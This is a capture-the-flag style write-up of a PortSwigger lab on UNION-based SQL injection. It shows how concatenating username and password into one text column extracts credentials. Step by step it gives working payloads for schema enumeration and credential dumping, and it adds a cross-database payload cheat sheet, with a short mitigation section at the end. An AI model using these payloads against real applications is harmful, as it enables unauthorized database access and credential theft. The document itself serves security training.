# SQL Injection UNION Attack - Retrieving Multiple Values in a Single Column

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Extract usernames and passwords from the database when only **one column accepts text data**, requiring string concatenation to retrieve both values together.

---

## Vulnerability

The application is vulnerable to UNION-based SQL injection in the product category filter. However, this lab presents a new challenge: **only one of the two columns accepts string data**. This means we cannot use separate columns for username and password like in previous labs.

**Backend Query Structure:**
```sql
SELECT id, description FROM products WHERE category = 'USER_INPUT'
```
- Column 1 (`id`): Integer — does NOT accept text
- Column 2 (`description`): Text — accepts strings

**Developer Mistake:**  
- **No input sanitization** allowing SQL injection
- **Mixed data types** in query result columns
- **No output filtering** — concatenated strings displayed directly
- **Database permissions** allow querying `information_schema`

This lab teaches an important real-world technique: **when limited by column data types, concatenate multiple values into one column**.

---

## Understanding String Concatenation

### The Problem:

In previous labs, we could do:
```sql
' UNION SELECT username, password FROM users--
```

But when **only one column accepts text**, this fails:
```sql
' UNION SELECT username, password FROM users--
❌ Error: Column 1 expects INTEGER, got STRING
```

### The Solution:

**Concatenate both values into the text column:**
```sql
' UNION SELECT NULL, username || '~' || password FROM users--
✅ Success: All data in one column
```

### Concatenation Operators by Database:

| Database | Operator | Example |
|----------|----------|---------|
| **Oracle** | `\|\|` | `username \|\| '~' \|\| password` |
| **PostgreSQL** | `\|\|` | `username \|\| '~' \|\| password` |
| **MySQL** | `CONCAT()` | `CONCAT(username, '~', password)` |
| **MSSQL** | `+` | `username + '~' + password` |

---

## My Attack Methodology

### 🔵 Step 1: Find Number of Columns

**Payload:**
```sql
' UNION SELECT NULL,NULL--
```

**Why this step:**
- Need to match column count for UNION to work
- Two NULLs worked → confirms 2 columns

**Result:** ✅ 2 columns confirmed

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, NULL--'
```

---

### 🔵 Step 2: Identify Text Column

**Payload:**
```sql
' UNION SELECT NULL,'a'--
```

**Why this step:**
- Need to find which column accepts text
- Tried text in column 2 → it worked
- Column 1 must be integer or incompatible type

**Result:** ✅ Only column 2 accepts text

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, 'a'--'
```

**What I saw:** The letter `'a'` appeared on the page, confirming column 2 is text-compatible.

**Note:** If I tried `' UNION SELECT 'a',NULL--`, it would fail because column 1 doesn't accept text.

---

### 🔵 Step 3: Enumerate Table Names

**Payload:**
```sql
' UNION SELECT NULL,table_name FROM information_schema.tables--
```

**Why this step:**
- Looking for the users table
- Must put `table_name` in column 2 (the text column)
- Column 1 gets NULL (compatible with integers)

**Result:** Found target table: `users` 🎯

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, table_name FROM information_schema.tables--'
```

**What I saw on the page:**
```
products
sessions
users    ← Target found!
...
```

---

### 🔵 Step 4: Enumerate Column Names

**Payload:**
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```

**Why this step:**
- Need to find column names in the users table
- Filtering by `table_name='users'` to narrow results
- Again, `column_name` goes in column 2 (text column)

**Result:** Found columns: `username` and `password` 🎯

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, column_name FROM information_schema.columns
WHERE table_name='users'--'
```

**What I saw on the page:**
```
username
password
```

---

### 🔵 Step 5: Extract Credentials Using Concatenation

**Payload:**
```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

**Why this step:**
- Have table name (`users`) and column names (`username`, `password`)
- **Cannot use two separate columns** — only column 2 accepts text
- **Concatenate both values** into one column using `||` operator
- Use `~` as separator to distinguish username from password

**Result:** 💥 Credentials dumped in concatenated format!

**Resulting SQL:**
```sql
SELECT id, description FROM products WHERE category = ''
UNION
SELECT NULL, username || '~' || password FROM users--'
```

**Extracted Data:**
```
administrator~hmk9yyqsby9w5ddyei36
```

**Parsing the result:**
- Username: `administrator`
- Separator: `~`
- Password: `hmk9yyqsby9w5ddyei36`

---

### 🔵 Step 6: Log In as Administrator

**Action:**
- Parsed the concatenated result
- Username: `administrator`
- Password: `hmk9yyqsby9w5ddyei36`

**Result:** ✅ Lab solved!

---

## Complete Attack Flow Visualization

```
Step 1: ' UNION SELECT NULL,NULL--
        ↓
        ✅ 2 columns exist

Step 2: ' UNION SELECT NULL,'a'--
        ↓
        ✅ Only column 2 accepts text (column 1 is integer)

Step 3: ' UNION SELECT NULL,table_name FROM information_schema.tables--
        ↓
        ✅ Found table: users

Step 4: ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
        ↓
        ✅ Found columns: username, password

Step 5: ' UNION SELECT NULL, username || '~' || password FROM users--
        ↓
        💥 Concatenated output: administrator~hmk9yyqsby9w5ddyei36

Step 6: Parse and log in
        ↓
        🎯 Lab solved!
```

---

## Why Concatenation Was Necessary

### The Constraint:

```sql
-- ❌ This would fail:
' UNION SELECT username, password FROM users--
Error: Column 1 expects INTEGER, got STRING 'administrator'

-- ✅ This works:
' UNION SELECT NULL, username || '~' || password FROM users--
Success: Column 1 gets NULL (compatible), Column 2 gets concatenated string
```

### Real-World Scenario:

Many databases have queries like:
```sql
SELECT product_id, product_name FROM products
```

Where `product_id` is an integer. Attackers must adapt by:
1. Identifying which columns accept text
2. Concatenating all needed data into those text columns
3. Using delimiters to parse results later

---

## What I Learned

1. **Not all columns accept all data types** — must identify text-compatible columns first
2. **Concatenation solves the single-column problem** — squeeze multiple values into one
3. **Delimiters are crucial** — use `~`, `:`, or `|` to separate concatenated values
4. **Different databases, different syntax** — `||` vs `CONCAT()` vs `+`
5. **Adaptation is key** — real-world exploitation requires flexible methodology

---

## String Concatenation Cheat Sheet

### PostgreSQL & Oracle:
```sql
' UNION SELECT NULL, username || '~' || password FROM users--
' UNION SELECT NULL, username || ':' || password || ':' || email FROM users--
```

### MySQL:
```sql
' UNION SELECT NULL, CONCAT(username, '~', password) FROM users--
' UNION SELECT NULL, CONCAT(username, ':', password, ':', email) FROM users--
```

### Microsoft SQL Server:
```sql
' UNION SELECT NULL, username + '~' + password FROM users--
' UNION SELECT NULL, username + ':' + password + ':' + email FROM users--
```

### With Custom Separators:
```sql
-- Using pipe symbol
username || '|' || password  → administrator|password123

-- Using colon
username || ':' || password  → administrator:password123

-- Using tilde (recommended - rarely used in data)
username || '~' || password  → administrator~password123
```

---

## Concatenating More Than Two Values

### Three Columns:
```sql
' UNION SELECT NULL, username || '~' || password || '~' || email FROM users--

Result: administrator~hmk9yyqsby9w5ddyei36~admin@example.com
```

### Four Columns:
```sql
' UNION SELECT NULL, username || '|' || password || '|' || email || '|' || role FROM users--

Result: administrator|password123|admin@example.com|admin
```

**Parsing Strategy:**
```python
# Split by delimiter
data = "administrator~hmk9yyqsby9w5ddyei36"
username, password = data.split('~')
print(f"Username: {username}")  # administrator
print(f"Password: {password}")  # hmk9yyqsby9w5ddyei36
```

---

## Real-World Application

### Common Scenarios Requiring Concatenation:

1. **E-commerce product listings** — `product_id` (int) + `product_name` (text)
2. **User dashboards** — `user_id` (int) + `user_data` (text)
3. **Financial reports** — `transaction_id` (int) + `description` (text)
4. **Inventory systems** — `item_code` (int) + `item_details` (text)

In all cases, only the text column can be exploited for data extraction, requiring concatenation.

---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) — prevents all SQL injection
- Apply **strict type validation** — reject non-numeric input for integer columns
- Implement **input sanitization** as defense-in-depth
- **Restrict database permissions** — revoke access to `information_schema`

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT id, description FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT id, description FROM products WHERE category = ?"
cursor.execute(query, (user_input,))
```
